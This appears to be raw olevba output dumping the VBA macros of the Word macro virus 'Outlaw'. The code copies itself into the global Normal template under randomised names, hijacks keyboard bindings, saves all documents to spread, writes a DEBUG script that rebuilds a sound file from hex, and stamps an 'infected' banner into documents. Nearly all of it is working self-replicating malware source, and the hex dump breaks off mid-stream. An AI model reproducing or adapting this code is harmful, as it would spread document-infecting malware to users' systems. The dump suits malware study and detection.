olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Outlaw-19c09bc2780731375f79ddf09886ec5de3de576c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Outlaw-19c09bc2780731375f79ddf09886ec5de3de576c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO S7601.bas 
in file: Virus.MSWord.Outlaw-19c09bc2780731375f79ddf09886ec5de3de576c - OLE stream: 'Macros/VBA/S7601'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim A$
On Error GoTo -1: On Error GoTo Done

A$ = WordBasic.[FileName$]()
If A$ = "" Then GoTo Finish

If CheckInstalled = 0 Then
    Routine
    Crypt
    PayloadMakro
    WordBasic.FileSaveAll 1, 1
Else
    GoTo Done
End If

Done:
A$ = WordBasic.[FileName$]()
If A$ = "" Then
    GoTo Finish
Else
    WordBasic.Insert " "
End If

Finish:
End Sub

Private Sub Crypt()
Dim One
Dim Two
Dim Num
Dim A$
Dim Beginn
Dim B$
Dim C$
Dim E$
Dim ZU$
Dim PG$
One = 7369
Two = 9291
Num = WordBasic.Int(Rnd() * (Two - One) + One)
A$ = Str(Num)
A$ = WordBasic.[LTrim$](A$)

Beginn = WordBasic.Hour(WordBasic.Now())
B$ = Str(Beginn)
B$ = WordBasic.[LTrim$](B$)

If B$ = "1" Then C$ = "A"
If B$ = "2" Then C$ = "B"
If B$ = "3" Then C$ = "C"
If B$ = "4" Then C$ = "D"
If B$ = "5" Then C$ = "E"
If B$ = "6" Then C$ = "F"
If B$ = "7" Then C$ = "G"
If B$ = "8" Then C$ = "H"
If B$ = "9" Then C$ = "I"
If B$ = "10" Then C$ = "J"
If B$ = "11" Then C$ = "K"
If B$ = "12" Then C$ = "L"
If B$ = "13" Then C$ = "M"
If B$ = "14" Then C$ = "N"
If B$ = "15" Then C$ = "O"
If B$ = "16" Then C$ = "P"
If B$ = "17" Then C$ = "Q"
If B$ = "18" Then C$ = "R"
If B$ = "19" Then C$ = "S"
If B$ = "20" Then C$ = "T"
If B$ = "21" Then C$ = "U"
If B$ = "22" Then C$ = "V"
If B$ = "23" Then C$ = "W"
If B$ = "00" Then C$ = "X"

E$ = C$ + A$
ZU$ = WordBasic.[GetDocumentVar$]("VirNameDoc")
PG$ = WordBasic.[WindowName$]() + ":" + ZU$
WordBasic.MacroCopy PG$, "Global:" + E$
WordBasic.SetProfileString "Intl", "Name2", E$
WordBasic.ToolsCustomizeKeyboard KeyCode:=69, Category:=2, Name:=E$, Add:=1, Context:=0
End Sub


Private Sub Routine()
Dim One
Dim Two
Dim Num
Dim A$
Dim Beginn
Dim B$
Dim C$
Dim D$
Dim UZ$
Dim GP$
One = 7369
Two = 9291
Num = WordBasic.Int(Rnd() * (Two - One) + One)
A$ = Str(Num)
A$ = WordBasic.[LTrim$](A$)

Beginn = WordBasic.Hour(WordBasic.Now())
B$ = Str(Beginn)
B$ = WordBasic.[LTrim$](B$)

If B$ = "1" Then C$ = "A"
If B$ = "2" Then C$ = "B"
If B$ = "3" Then C$ = "C"
If B$ = "4" Then C$ = "D"
If B$ = "5" Then C$ = "E"
If B$ = "6" Then C$ = "F"
If B$ = "7" Then C$ = "G"
If B$ = "8" Then C$ = "H"
If B$ = "9" Then C$ = "I"
If B$ = "10" Then C$ = "J"
If B$ = "11" Then C$ = "K"
If B$ = "12" Then C$ = "L"
If B$ = "13" Then C$ = "M"
If B$ = "14" Then C$ = "N"
If B$ = "15" Then C$ = "O"
If B$ = "16" Then C$ = "P"
If B$ = "17" Then C$ = "Q"
If B$ = "18" Then C$ = "R"
If B$ = "19" Then C$ = "S"
If B$ = "20" Then C$ = "T"
If B$ = "21" Then C$ = "U"
If B$ = "22" Then C$ = "V"
If B$ = "23" Then C$ = "W"
If B$ = "00" Then C$ = "X"

D$ = C$ + A$
UZ$ = WordBasic.[GetDocumentVar$]("VirName")
GP$ = WordBasic.[WindowName$]() + ":" + UZ$
WordBasic.MacroCopy GP$, "Global:" + D$
WordBasic.SetProfileString "Intl", "Name", D$
WordBasic.ToolsCustomizeKeyboard KeyCode:=32, Category:=2, Name:=D$, Add:=1, Context:=0
End Sub

Private Sub PayloadMakro()
Dim One
Dim Two
Dim Num
Dim A$
Dim Beginn
Dim B$
Dim C$
Dim K$
Dim ZUZ$
Dim GP$
One = 7369
Two = 9291
Num = WordBasic.Int(Rnd() * (Two - One) + One)
A$ = Str(Num)
A$ = WordBasic.[LTrim$](A$)

Beginn = WordBasic.Hour(WordBasic.Now())
B$ = Str(Beginn)
B$ = WordBasic.[LTrim$](B$)

If B$ = "1" Then C$ = "A"
If B$ = "2" Then C$ = "B"
If B$ = "3" Then C$ = "C"
If B$ = "4" Then C$ = "D"
If B$ = "5" Then C$ = "E"
If B$ = "6" Then C$ = "F"
If B$ = "7" Then C$ = "G"
If B$ = "8" Then C$ = "H"
If B$ = "9" Then C$ = "I"
If B$ = "10" Then C$ = "J"
If B$ = "11" Then C$ = "K"
If B$ = "12" Then C$ = "L"
If B$ = "13" Then C$ = "M"
If B$ = "14" Then C$ = "N"
If B$ = "15" Then C$ = "O"
If B$ = "16" Then C$ = "P"
If B$ = "17" Then C$ = "Q"
If B$ = "18" Then C$ = "R"
If B$ = "19" Then C$ = "S"
If B$ = "20" Then C$ = "T"
If B$ = "21" Then C$ = "U"
If B$ = "22" Then C$ = "V"
If B$ = "23" Then C$ = "W"
If B$ = "00" Then C$ = "X"

K$ = C$ + A$
ZUZ$ = WordBasic.[GetDocumentVar$]("VirNamePayload")
GP$ = WordBasic.[WindowName$]() + ":" + ZUZ$
WordBasic.MacroCopy GP$, "Global:" + K$
WordBasic.SetProfileString "Intl", "Name3", K$
End Sub

Private Function CheckInstalled()
Dim CC$
Dim i
CC$ = WordBasic.[GetProfileString$]("Intl", "Name")
    CheckInstalled = 0
    If WordBasic.CountMacros(0) > 0 Then
        For i = 1 To WordBasic.CountMacros(0)
            If WordBasic.[MacroName$](i, 0) = CC$ Then
                CheckInstalled = 1
            End If
        Next i
    End If
End Function
-------------------------------------------------------------------------------
VBA MACRO S7573.bas 
in file: Virus.MSWord.Outlaw-19c09bc2780731375f79ddf09886ec5de3de576c - OLE stream: 'Macros/VBA/S7573'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Declare Function GetWindowsDirectoryA Lib "Kernel32" (ByVal WinDir$, ByVal nSize As Long) As Long
Private Declare Function sndPlaySound Lib "winmm.dll" Alias "sndPlaySoundA" (ByVal pszSoundName As String, ByVal uFlags As Long) As Long

Public Sub MAIN()
Dim NO$
Dim NJ$
Dim G$
Dim WinDir$
Dim n
Dim WindDir$
WindDir$ = Space(255)
    Install
    Insert
    NO$ = WordBasic.[GetProfileString$]("Intl", "Name")
    NJ$ = WordBasic.[MacroFileName$](NO$)
    G$ = WordBasic.[FileNameInfo$](NJ$, 5)
    WinDir$ = String(255, "X")
    n = GetWindowsDirectoryA(WindDir$, 255)
    n = sndPlaySound(G$ + "laugh.wav ", 0)
End Sub

Private Sub Insert()
WordBasic.ToggleFull
WordBasic.DocMaximize
WordBasic.InsertPara
WordBasic.Insert Chr(9) + Chr(9) + Chr(9) + Chr(9) + Chr(9)
WordBasic.Bold
WordBasic.FontSize 18
WordBasic.Insert "You are infected with"
WordBasic.InsertPara
WordBasic.InsertPara
WordBasic.InsertPara
WordBasic.FontSize 72
WordBasic.Insert Chr(9) + Chr(9) + Chr(9) + Chr(9) + "Outlaw"
WordBasic.InsertPara
WordBasic.InsertPara
WordBasic.FontSize 18
WordBasic.Insert Chr(9) + Chr(9) + Chr(9) + Chr(9) + "A virus from Nightmare Joker"
End Sub

Private Sub Install()
Dim NO$
Dim NJ$
Dim G$
Dim n
Dim Timer_
WordBasic.FileNew Template:="Normal.dot", NewTemplate:=1
NO$ = WordBasic.[GetProfileString$]("Intl", "Name")
NJ$ = WordBasic.[MacroFileName$](NO$)
G$ = WordBasic.[FileNameInfo$](NJ$, 5)
Open G$ + "laugh.scr" For Output As 1
Print #1, "N LAUGH.COM"
Print #1, "E 0100 52 49 46 46 32 0E 00 00 57 41 56 45 66 6D 74 20"
Print #1, "E 0110 32 00 00 00 22 00 01 00 40 1F 00 00 2B 04 00 00"
Print #1, "E 0120 20 00 01 00 20 00 01 00 F0 00 00 00 00 00 00 00"
Print #1, "E 0130 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0140 00 00 00 00 00 00 66 61 63 74 04 00 00 00 08 68"
Print #1, "E 0150 00 00 64 61 74 61 E0 0D 00 00 9B 59 2B 31 7F 2C"
Print #1, "E 0160 F4 2F 88 48 2E BF 42 88 88 71 C0 B0 DE 7E F9 67"
Print #1, "E 0170 82 49 58 A9 06 00 69 87 5C 19 41 E2 D2 75 FF FF"
Print #1, "E 0180 FF 0F 55 15 55 25 00 00 00 00 10 8B 08 0A B0 4B"
Print #1, "E 0190 B1 88 A0 37 B0 05 A0 37 00 44 99 D1 D1 4C FF CF"
Print #1, "E 01A0 0D 2C 00 80 BF B4 A8 06 92 7A 20 E1 23 58 29 D5"
Print #1, "E 01B0 A3 BD 1B A4 09 A9 3B C8 1D 50 95 5C D1 55 7F 62"
Print #1, "E 01C0 32 46 12 EA CE 57 2A 44 AA 19 0C 97 26 6F 8A D0"
Print #1, "E 01D0 98 A6 8D BB E9 79 DB 70 89 D1 9D 3C DB BC 1E 4F"
Print #1, "E 01E0 B0 45 DC 2A 28 C9 FB BE 0A 5D 9C 11 39 8D 3F AF"
Print #1, "E 01F0 F2 E6 7B 49 63 07 DD 24 B0 BA DF D3 E2 B8 A7 F0"
Print #1, "E 0200 EF 44 A7 BA 22 C5 77 2A 57 57 0C 9F E6 30 DD 9A"
Print #1, "E 0210 CC 82 3E F4 CC 81 DC 88 C2 B3 1F 44 DB 94 A9 2E"
Print #1, "E 0220 E6 46 22 5D EF 1F 17 1D 9B 52 BE D9 91 F9 DC AF"
Print #1, "E 0230 B9 83 AC 0D 2C 86 6F E9 04 93 D9 5C 4A 9A AD 40"
Print #1, "E 0240 32 59 20 D2 5E 0D 8C 66 C8 55 1D 91 43 3A 6D FF"
Print #1, "E 0250 E0 EB CC D5 D8 34 4C ED 0D 57 1F 64 59 D5 47 D1"
Print #1, "E 0260 FF 57 63 2A 0A 99 6E 6A 77 65 1E 58 AD 3A 6F 8C"
Print #1, "E 0270 62 25 EE 43 C8 47 5D 7E 71 66 9F 6B C2 99 C5 1A"
Print #1, "E 0280 30 4C F5 1A C0 DD 08 BD 36 40 7D 63 9E 63 9E 31"
Print #1, "E 0290 30 81 8D C1 70 AD BD A8 F0 9F 1B 64 CA B9 CC 12"
Print #1, "E 02A0 1B 48 88 7A 9F 92 3B 9F 28 45 BF B1 81 CB AE 8E"
Print #1, "E 02B0 DD A7 2C 75 65 27 5D 76 19 E3 DF EB C9 B9 23 D8"
Print #1, "E 02C0 89 41 FE E9 C1 96 20 67 35 40 9D 11 76 08 AD A3"
Print #1, "E 02D0 4C EE 1E E7 90 72 4E 96 46 8A DB EB E2 B9 5E 51"
Print #1, "E 02E0 92 48 C8 3D E2 52 75 A2 85 44 2D BB DB D1 CF D9"
Print #1, "E 02F0 29 FD BE A4 2E 81 EE 28 66 1B DD EB C2 BD 69 59"
Print #1, "E 0300 6C 45 C2 C6 F7 2B 86 3F 00 4F 9F 9D 08 8B FE 05"
Print #1, "E 0310 76 DC AD E3 5B 1B BE 93 78 40 61 6C 32 B9 AE 7F"
Print #1, "E 0320 CD 4C 27 48 6B B2 D1 F5 4D 6F 2F DA 51 4B 0F 42"
Print #1, "E 0330 B9 BA 5E B4 72 02 6E 73 70 4D DD E3 CA BD 47 A5"
Print #1, "E 0340 13 56 E9 BF C6 10 55 97 CA 55 DF E7 79 7B AF 8A"
Print #1, "E 0350 C4 64 3F 99 24 A2 8F 9F 6D 3C DB 5B D3 79 30 D2"
Print #1, "E 0360 7B 3C 7D 7D 75 BD 5D 2A E0 7E 4F 18 A9 E9 4F F7"
Print #1, "E 0370 BC FD 4F 03 86 1D 5F E4 6C 66 E3 52 A9 75 D9 BB"
Print #1, "E 0380 52 7B FA DF DF B7 A9 0D C9 78 2F 5B A2 F7 3F 8E"
Print #1, "E 0390 82 A0 BF 8B 36 47 6F B2 ED B1 67 E2 39 91 B5 13"
Print #1, "E 03A0 AA 4B F5 D5 2F A4 44 8D E7 5F 7E 62 BE 1E DF 89"
Print #1, "E 03B0 C6 44 4F 23 A9 25 5F B6 11 68 A1 DA B9 78 2B 22"
Print #1, "E 03C0 2A 66 E9 7D 5D 35 86 9F 61 75 AF 68 75 26 9E D9"
Print #1, "E 03D0 DB C0 6F E4 E2 D7 AE 47 F9 20 9F 62 4A 55 8F E0"
Print #1, "E 03E0 5F 0B 9B 7D 57 47 DF CE 57 35 7E ED E1 96 4D 71"
Print #1, "E 03F0 43 56 CD 6F 68 A2 7C 24 80 78 61 E4 32 B5 12 54"
Print #1, "E 0400 0B 63 33 7D 6C C7 C7 06 C0 5F BC 29 6E BE AD 6A"
Print #1, "E 0410 C0 17 DD 5F EC B3 5D F7 F2 41 21 64 BA AD 76 3E"
Print #1, "E 0420 51 70 F9 05 CA 1F 77 C1 19 39 BD 87 D2 89 2E 50"
Print #1, "E 0430 1D B4 0C A2 0C 75 0D 49 89 E7 DD E3 C9 99 CE 4E"
Print #1, "E 0440 0F 76 82 2E ED 13 4B B5 50 6F 5E 92 36 01 4D F1"
Print #1, "E 0450 02 B6 9C 29 10 63 AD AF 03 35 9B EB 4A 7A 4E 87"
Print #1, "E 0460 16 39 24 C8 FD 77 08 87 2E 65 BE BD F3 29 9C D9"
Print #1, "E 0470 94 58 3D D2 B5 5A 0D 62 BD DE DB 73 5A 7A 2B 22"
Print #1, "E 0480 3F 08 53 FD 57 A3 29 AA 7E 4F 0C 7A 08 A8 5D 87"
Print #1, "E 0490 78 17 BD 2D 1A 85 FC FE A3 03 5D E3 49 95 FB 6C"
Print #1, "E 04A0 2C 79 96 6E AE 52 2E 10 01 3A 1D 86 F3 A7 8D 43"
Print #1, "E 04B0 88 AB FD 7B 45 18 2D E2 1D C8 DF 5B C2 75 C5 12"
Print #1, "E 04C0 6C 45 1A 5B E3 5B B5 68 05 4F DC 69 8A 40 9D 87"
Print #1, "E 04D0 CB F8 DD 8B 3E 0A AC AE 5D 12 DF 6B 49 B5 44 4C"
Print #1, "E 04E0 53 4E 3D 02 A6 B8 72 AF F5 7E 4D A1 C1 2B 5E 1A"
Print #1, "E 04F0 86 F4 9D D7 AB D8 EC E3 A5 59 9D 43 42 6D C4 FF"
Print #1, "E 0500 DF 05 69 8D A7 CD AF 49 55 05 3C 3C 23 9C 9C 87"
Print #1, "E 0510 B8 17 3E 20 FA 5E BF 4C 7E EA 23 D3 D9 54 AE D6"
Print #1, "E 0520 A8 15 5F DF 7F 4D D7 55 FF 1F CF 61 41 02 8F E7"
Print #1, "E 0530 35 0E 1F 6C 1B 99 7F E6 A5 05 21 DB 53 B5 43 E4"
Print #1, "E 0540 A9 18 D7 F7 D7 5D DD DF 5D 1D DF 34 76 27 8F BC"
Print #1, "E 0550 00 01 8F CF 02 E6 0F 26 23 23 A1 E2 52 95 A9 16"
Print #1, "E 0560 03 18 D5 5D FD 77 FF DF 5D 15 EF 34 A2 03 0F E8"
Print #1, "E 0570 75 D6 8F 0F 4A B9 DF 81 99 35 E3 5A 4A 75 8B D6"
Print #1, "E 0580 30 1C F7 DF D7 9D 75 DF 7D 15 BF F2 B5 83 BF 68"
Print #1, "E 0590 F2 29 3F FF 30 01 6F 66 EA DA 9D CA 39 51 AA 58"
Print #1, "E 05A0 F2 15 5D D5 5D FD FF 55 7F 15 9F 76 2D 12 EF 3A"
Print #1, "E 05B0 68 7D DF 0A 0B B4 8F EB F8 AF 17 52 C1 6C 91 77"
Print #1, "E 05C0 52 29 55 5D DF 4F F5 5D DD 2F 3F 2B 8E 88 8F 35"
Print #1, "E 05D0 D4 3F FF E1 F3 27 EF A2 06 2A DF 5A C9 50 B5 D8"
Print #1, "E 05E0 63 35 F3 DD 4C 87 F7 D1 59 37 DF 64 79 A4 CF 95"
Print #1, "E 05F0 F0 57 2E 3C B6 DC 8E 0D 1E 2D 61 53 C2 34 31 C1"
Print #1, "E 0600 4A 19 4E FA 42 6B D7 7A 62 2F 8F 9A 92 E6 5F BE"
Print #1, "E 0610 71 05 4E FF 38 C4 4E DD D9 1D 21 63 5A 51 12 E5"
Print #1, "E 0620 3C 29 5B 17 CB EF 5D DF DF 2C 4E 42 7A 71 BE FC"
Print #1, "E 0630 EB 1A CE 38 FC D6 FE CD E4 22 23 D3 5A 95 FA 98"
Print #1, "E 0640 92 66 FD BE E0 93 22 50 A8 46 BE FE 48 F0 CF 22"
Print #1, "E 0650 3E CB 2F AC 5A EA 0F EC 43 E3 DB D2 B9 54 AB 64"
Print #1, "E 0660 D2 7E FD B7 E8 8D 72 89 0E 18 1E EA 43 B0 3E 55"
Print #1, "E 0670 01 D3 EE FD 19 2A EE AF 52 93 E3 D2 CA 94 0B 85"
Print #1, "E 0680 0E 3A 7F CB 5F BD F7 D5 D7 45 AF 72 9D 46 7F E1"
Print #1, "E 0690 CC 38 7F F5 4D E5 0F C0 25 F1 E3 DA C1 94 C7 21"
Print #1, "E 06A0 F2 15 D7 DF DF AF 5D 5F 55 15 DF C5 CC FA 9F 0D"
Print #1, "E 06B0 9C 23 BF 86 BE 25 9F 72 EB FC A5 52 42 95 29 64"
Print #1, "E 06C0 4A 16 5F 7F FD D5 DF FD 7F 17 6F BF D5 53 BF 91"
Print #1, "E 06D0 41 12 5F 6E 8A 98 FF F7 92 EF E3 DA 42 79 48 DF"
Print #1, "E 06E0 4B 16 D7 77 F7 15 7F 5F D7 5F 7F 2B A0 F6 3F DA"
Print #1, "E 06F0 D3 57 EF B8 80 B9 0F AE 64 A9 DD C2 41 51 C9 23"
Print #1, "E 0700 21 1B F7 5F 5F 27 77 D7 F7 25 4F E7 60 9A 8F D5"
Print #1, "E 0710 A5 A2 5F 50 A1 D7 8F 09 C4 ED 4F 3A 2A 75 C0 8B"
Print #1, "E 0720 04 25 D9 77 DD 55 CF 8E 6F 25 7F 55 5E 53 2F A6"
Print #1, "E 0730 76 13 4F DE ED E1 AF 21 7C 1C D9 52 2A 71 29 D4"
Print #1, "E 0740 E9 2F 92 0D 57 1F B5 09 98 4F 0F 1A 5B 4C 7E 10"
Print #1, "E 0750 DC AA DF 24 28 EF 5F CB ED 94 9F DA 42 99 C9 27"
Print #1, "E 0760 31 28 DF 7F FD F6 5F 4A A0 6F 0E 89 C1 BD 9E 10"
Print #1, "E 0770 3A 07 9E FD 12 F8 0E A0 A9 49 25 63 B2 51 17 41"
Print #1, "E 0780 52 4C 1C EF FF EF 0A 4B 7D 45 FE B7 5B 46 2E 25"
Print #1, "E 0790 22 4B 7F DB 03 1A EE 68 5C 60 E1 4A D2 54 C4 ED"
Print #1, "E 07A0 26 76 03 AE 42 6F 66 77 29 79 2F 94 C1 CD AF 04"
Print #1, "E 07B0 99 B4 7E 71 0C 1A BF 5D DE FD E1 D2 CA 75 77 8F"
Print #1, "E 07C0 8A 24 5F 7D DD 6F 7D 5D DF 25 4F FC 5C DA 3F 92"
Print #1, "E 07D0 55 F7 BF 08 8E 89 7F 05 BE 0C 63 63 3A 75 DE D6"
Print #1, "E 07E0 2F 25 75 DD F7 2F FF 7F F7 25 3F 06 06 64 8F 33"
Print #1, "E 07F0 FA BF 6F 5E 14 6D CF A3 0E 27 A3 D3 32 95 AF 5A"
Print #1, "E 0800 EB 25 DD D5 7D 57 FF DF FD 2D 7F 53 86 CB 9F 6C"
Print #1, "E 0810 65 DD AF 32 7E 13 DF 68 6D 0E 23 D3 CA 74 09 5D"
Print #1, "E 0820 2B 27 55 D5 F7 6D F7 77 F7 27 6F A4 D9 04 CF 4A"
Print #1, "E 0830 F5 81 8F 52 CE 81 CF 6A C2 04 1B 63 2A 31 4A F8"
Print #1, "E 0840 8A 24 57 F5 75 FF 55 FF F5 1F DF 6A 70 23 BF 3E"
Print #1, "E 0850 B8 80 5F EF 40 A2 CF 6F 98 39 53 32 39 71 49 AD"
Print #1, "E 0860 5D 2E 57 57 49 1F 80 CB F5 37 7F DE 49 56 6F AE"
Print #1, "E 0870 3A 02 CF 7A E3 30 DE CC B4 99 61 E3 C9 74 17 D2"
Print #1, "E 0880 5F 72 F3 5D EF 95 5F B7 8A 6F FF A3 20 03 5E 52"
Print #1, "E 0890 D2 94 2E A4 95 22 4F 1D 4C 92 DF 5A C3 70 4A D8"
Print #1, "E 08A0 22 56 CA ED 6A 45 47 F7 87 2B 3E 67 A9 0D EE 9E"
Print #1, "E 08B0 D4 79 FE 52 00 66 7E 6B 76 AE E3 5B 3A 95 76 20"
Print #1, "E 08C0 FF 5E AA 3C 26 B2 3D 5F 3F 7B BF 6D DE 8E EE 84"
Print #1, "E 08D0 84 D3 DE 44 B4 0D BE 5A E4 F5 5D 53 B2 70 76 12"
Print #1, "E 08E0 31 29 FD 20 63 FD AD 57 AF 44 4E 26 FD AB 5E 65"
Print #1, "E 08F0 18 85 2E C9 B2 1F DE 00 FA 29 5D E3 B2 95 8E 53"
Print #1, "E 0900 64 24 F9 C7 F7 6F 7F 77 5F 15 9E E5 CA 19 AD 4E"
Print #1, "E 0910 7E DA 8F 82 96 F5 7F 06 76 08 A3 62 CC B8 EF 93"
Print #1, "E 0920 B0 18 57 77 FD FD 7F D5 FD 0F 7F 5D C6 7C 3F 88"
Print #1, "E 0930 4C 8A CF 3E 70 0F 9F 90 C4 1C E3 DA 54 99 23 57"
Print #1, "E 0940 6C 3F 7D DD 5F 07 57 DD 7F 1F 9F DC 64 94 5F 88"
Print #1, "E 0950 AB 9E CF 45 DC 11 7F A2 A3 5E 25 DB 42 D9 A1 1A"
Print #1, "E 0960 64 18 F5 F7 77 6D DF FD DF 17 4F 67 6C 3D 8F 21"
Print #1, "E 0970 9B 11 0F 50 B6 AC 4F 79 7E 5C E7 5A BB B9 3D A1"
Print #1, "E 0980 EE 14 FF 57 FD B5 FF 77 5F 5F 6F 4E 02 61 DF 72"
Print #1, "E 0990 36 C3 1F 8E 08 BF 7F B7 BA 15 A5 5B C2 94 5B B3"
Print #1, "E 09A0 F0 65 F7 DD FD A5 75 DF FD 1D 7F 61 DA 55 EF 29"
Print #1, "E 09B0 B4 70 2F 2F CB 62 9F ED 5D F8 21 6B CA 71 8C 0B"
Print #1, "E 09C0 6C 53 FD D5 57 75 D7 DF DF 7D 4F 1A 8B F0 0F AD"
Print #1, "E 09D0 31 CF 7F DA 68 99 FF 86 0C BB 21 D3 A1 70 C1 18"
Print #1, "E 09E0 71 75 FF 75 E6 B1 5B 9F 71 75 8F BF A4 D2 BF 46"
Print #1, "E 09F0 F9 32 3F 54 98 1B 7F 6B 26 09 A1 62 54 95 92 D5"
Print #1, "E 0A00 73 55 DD BF 80 CB AE 9F 2B 2F 7F E5 95 F2 0F 9A"
Print #1, "E 0A10 BD BD DF 7F 83 F6 7F 64 D6 11 21 E3 BA 98 31 18"
Print #1, "E 0A20 26 76 FC D7 CF 1D AB 89 F6 1F CE 28 FD 13 3E 32"
Print #1, "E 0A30 DB 9E BF CD DD 5B 3E 70 76 AE A3 5A CB 70 F6 23"
Print #1, "E 0A40 11 56 C8 B3 6A C4 FE F5 7F 37 6F C7 32 CB DF 5A"
Print #1, "E 0A50 8B C8 BE 4E 64 A4 4E FA AD F5 61 DB 32 95 9B 5A"
Print #1, "E 0A60 2D 26 5C 7F E6 36 E8 AE A3 28 7E 71 98 9C 9F 7C"
Print #1, "E 0A70 3B 64 BF 7B 8A 03 5E 89 6B 02 DF D2 B1 90 C9 20"
Print #1, "E 0A80 F1 22 54 26 EB BD 82 0B 02 1F BE FB 33 1D DE F1"
Print #1, "E 0A90 3B 85 CE 47 B8 38 1E E1 E9 C3 23 63 43 91 A4 8E"
Print #1, "E 0AA0 1D 56 A8 2D 30 AB 9A 7D 9F 5D 5F 66 60 88 8F 5F"
Print #1, "E 0AB0 F9 7D 6F 53 34 14 2E 72 0D D1 5F 6B B2 94 C9 14"
Print #1, "E 0AC0 B2 55 FF FF 3F 49 7D DD DD 2D 2E 8A CE E2 7F AF"
Print #1, "E 0AD0 96 87 4F 2C 15 9B 0F 65 C2 1E 65 EB 3A B5 70 BD"
Print #1, "E 0AE0 AB 58 77 D7 D7 0D D5 75 FF 2F 0F 0C 99 C7 9F D6"
Print #1, "E 0AF0 E5 D3 6F 76 F2 E5 FF 6A 54 5F A3 5B 3B 99 27 63"
Print #1, "E 0B00 0A 2D 57 FF DD 7F DD D7 FF 55 BF EA 7A 00 3F CA"
Print #1, "E 0B10 09 5A CF F0 25 30 AF AC 1E 42 61 EB 33 99 29 E0"
Print #1, "E 0B20 45 29 F5 F7 F7 3D 77 7F FD 65 DF A4 1E 9C CF A0"
Print #1, "E 0B30 CE 37 2F 0F E4 C7 1F 60 AA 2D E1 EB C2 99 1F 59"
Print #1, "E 0B40 EB 68 F5 DD 77 E7 F5 FF F5 2F BF 58 56 30 7F 9A"
Print #1, "E 0B50 6E 1E 0F 47 98 2F DF 22 28 9B 61 E3 C3 B9 83 5A"
Print #1, "E 0B60 AD 35 57 1F 62 1D 57 7F 5D 35 FF 51 5C 32 8F 87"
Print #1, "E 0B70 FC 76 BF 4F 28 7E 6F 5A C5 09 5F F3 C9 9D 9C 27"
Print #1, "E 0B80 61 73 7F DD FF A7 D8 DD D7 2D 4F DB 9C 06 1F 10"
Print #1, "E 0B90 F0 10 2F 3E 62 0F 2F 08 61 EB 61 6B B2 B9 2E D7"
Print #1, "E 0BA0 20 39 DF F7 75 B6 F5 D7 DD 3F 6F A4 08 DD 1F 69"
Print #1, "E 0BB0 A6 66 6F CF 53 1E DF 8F 04 E5 1D 6B 5B 75 2F 61"
Print #1, "E 0BC0 8D 38 DD 7F 55 9D 7E 9F 8D 34 FF 21 0A B1 AF 07"
Print #1, "E 0BD0 6E 36 0F A2 CA 57 8F A4 01 84 E1 63 33 BD BC 54"
Print #1, "E 0BE0 56 3B 5D FF FF CD 55 F7 CB 3E 9F 1A 00 F5 1F 2D"
Print #1, "E 0BF0 73 0A 1F B0 BE 30 2F F6 BA EC 23 64 33 DD C0 1E"
Print #1, "E 0C00 F0 39 15 7F D5 DC F7 9F FB 37 6F 9D 62 6C 4F A5"
Print #1, "E 0C10 5D 28 BF 03 73 B9 AF 33 F8 98 61 EC 41 99 AA D2"
Print #1, "E 0C20 89 34 B6 75 5F 06 E2 3D 63 4E 1F 4E 23 F9 EF 4B"
Print #1, "E 0C30 6E CB 5F 87 B0 88 4F 26 42 E2 1F E4 B2 BD C9 E2"
Print #1, "E 0C40 9F 33 5D EE C8 E4 BB 7F 05 5D 1F 22 79 F3 1F B0"
Print #1, "E 0C50 D6 DD 8F 0F 4C 8F 2F 8C 66 92 9F 6B B4 BD 7C B1"
Print #1, "E 0C60 C7 46 EE 84 E3 4D FF 91 6A 4A 8F 1E 02 01 2F 1C"
Print #1, "E 0C70 80 DF CF D3 1B 05 9F 86 5A 09 1F 6C 51 DA 2B 7E"
Print #1, "E 0C80 8D 50 5D 55 C4 8F 9F AB 2A 79 9F B6 C2 CE 0E 26"
Print #1, "E 0C90 81 89 9F 9B DE 73 1F 90 EE 9B DF DC 3A BE 42 A1"
Print #1, "E 0CA0 40 48 6A B4 63 8D A7 BF B2 4A 6F 5C 13 A3 EE 52"
Print #1, "E 0CB0 F6 E3 6E B8 C4 C4 7F C7 49 29 5D 6B D3 BD 0C 9D"
Print #1, "E 0CC0 0B 43 3B DD 62 97 FD AC 63 4F 4E 57 10 8E 6F 3B"
Print #1, "E 0CD0 69 4F 6F A8 0C 15 AF 0C C6 EB DF EB D1 B9 3D 2D"
Print #1, "E 0CE0 2C 58 50 15 D9 4C D5 FD FF 61 CF 21 01 31 2F 1D"
Print #1, "E 0CF0 61 A4 BE 10 D8 FA AE 88 E8 BE 1F 64 C2 99 1A 64"
Print #1, "E 0D00 32 45 ED 9F 94 C9 0E 7D F7 4D BE 30 BC 94 2F E8"
Print #1, "E 0D10 5D 82 0E 9C 7A 4D 9E D0 EB E5 1F EC BA BD 40 62"
Print #1, "E 0D20 E0 4D 36 7F 46 D1 8A F0 3F 4B CE A6 4E 1F 7E 25"
Print #1, "E 0D30 E5 53 4F 61 B4 FE AE A0 A0 86 E1 64 61 B9 C8 F1"
Print #1, "E 0D40 06 48 FF 57 1F 02 42 80 B0 5A FE DE 41 E4 EE 86"
Print #1, "E 0D50 D8 B2 2F 84 CE 88 3F 1D E8 E4 1F 64 CA 9A 8B 56"
Print #1, "E 0D60 D1 5C 9A 9F C0 4B 14 7F 3A 55 2E 13 0D BF 3F A9"
Print #1, "E 0D70 8B 73 EE CE 1C F1 9E 87 30 03 A1 D4 CA BD B5 7A"
Print #1, "E 0D80 69 55 3A D8 1F 79 7D D5 FF 5D 9F D7 65 80 AE 44"
Print #1, "E 0D90 CA 6E FE E5 9D CD 0D F9 FC 26 E3 EB 32 B9 02 62"
Print #1, "E 0DA0 03 1D 3B 04 68 AA 02 F7 B9 5F 7F 4A 11 A1 7F 3F"
Print #1, "E 0DB0 5A 92 CF 41 D4 8E AF BD 85 F8 61 E4 41 99 AB A0"
Print #1, "E 0DC0 3D 55 8E 4A 9D CB EB 99 E6 5F AF 32 26 D6 8E F0"
